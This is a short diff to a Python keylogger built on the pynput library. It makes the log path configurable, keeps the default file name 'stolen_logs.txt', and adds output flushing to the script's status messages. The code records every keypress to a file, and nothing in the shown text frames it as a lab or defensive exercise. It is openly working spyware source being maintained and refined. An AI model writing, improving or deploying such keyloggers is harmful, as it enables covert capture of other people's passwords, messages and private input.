@@ -1,7 +1,10 @@
 from pynput import keyboard
 import os
 
-LOG_FILE = "stolen_logs.txt"
+try:
+    from config import LOG_FILE
+except ImportError:
+    LOG_FILE = os.path.join(os.path.dirname(os.path.abspath(__file__)), "stolen_logs.txt")
 
 
 def on_press(key):
@@ -12,7 +15,7 @@ def on_press(key):
             else:
                 f.write(f" [{key}] ")
     except Exception as e:
-        print(f"[-] Error logging key: {e}")
+        print(f"[-] Error logging key: {e}", flush=True)
 
 
 def on_release(key):
@@ -21,12 +24,12 @@ def on_release(key):
 
 
 def main():
-    print("[+] Keylogger started. Press ESC to stop.")
+    print("[+] Keylogger started. Press ESC to stop.", flush=True)
     try:
         with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
             listener.join()
     except Exception as e:
-        print(f"[-] Error starting listener: {e}")
+        print(f"[-] Error starting listener: {e}", flush=True)
 
 
 if __name__ == "__main__":
